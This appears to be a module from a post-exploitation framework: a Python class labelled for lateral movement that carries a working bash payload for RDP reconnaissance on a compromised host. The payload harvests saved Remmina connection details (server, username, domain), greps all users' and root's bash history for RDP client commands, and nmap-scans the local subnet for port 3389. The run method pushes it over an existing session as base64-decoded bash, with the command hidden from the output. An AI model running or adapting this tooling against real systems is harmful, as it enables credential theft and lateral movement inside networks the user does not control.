"""RDP session enumeration script."""

from ..base import OperatorScript, ScriptResult


class RDPEnum(OperatorScript):
    """Enumerate RDP sessions and configurations."""
    
    name = "RDP Enumeration"
    description = "Enumerate RDP sessions and configurations"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] RDP SESSION ENUMERATION"
echo "==========================="
echo ""

echo "[+] Checking for RDP listeners (port 3389):"
ss -tnlp 2>/dev/null | grep ":3389" || netstat -tnlp 2>/dev/null | grep ":3389"
echo ""

echo "[+] Active RDP connections:"
ss -tnp 2>/dev/null | grep ":3389" || netstat -tnp 2>/dev/null | grep ":3389"
echo ""

echo "[+] Checking for xrdp (Linux RDP server):"
if command -v xrdp &>/dev/null; then
    echo "[+] xrdp is installed"
    systemctl status xrdp 2>/dev/null || service xrdp status 2>/dev/null
    
    echo ""
    echo "[*] xrdp configuration:"
    cat /etc/xrdp/xrdp.ini 2>/dev/null | grep -v "^#" | grep -v "^$"
else
    echo "[-] xrdp not found"
fi
echo ""

echo "[+] Checking for RDP client tools:"
command -v rdesktop &>/dev/null && echo "[+] rdesktop available"
command -v xfreerdp &>/dev/null && echo "[+] xfreerdp available"
command -v remmina &>/dev/null && echo "[+] remmina available"
echo ""

echo "[+] Searching for saved RDP connections:"
find /home -name ".remmina" -o -name ".local/share/remmina" 2>/dev/null | while read dir; do
    echo "[!] Found Remmina config: $dir"
    find "$dir" -type f -name "*.remmina" 2>/dev/null | while read file; do
        echo "  - $file"
        grep -E "server|username|domain" "$file" 2>/dev/null
    done
done
echo ""

echo "[+] Searching for RDP credentials in bash history:"
find /home /root -name ".bash_history" 2>/dev/null -exec grep -H "rdesktop\|xfreerdp\|remmina" {} \;
echo ""

echo "[+] Discovering RDP hosts on network:"
LOCAL_NET=$(ip route | grep default | awk '{print $3}' | cut -d. -f1-3).0/24
if command -v nmap &>/dev/null; then
    echo "[*] Scanning $LOCAL_NET for RDP (port 3389)"
    nmap -p 3389 --open -T4 $LOCAL_NET 2>/dev/null | grep "Nmap scan\|3389"
else
    echo "[-] nmap not available for network scan"
fi
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Enumerating RDP sessions...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="RDP enumeration executed",
                metadata={"script": "rdp_enum"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
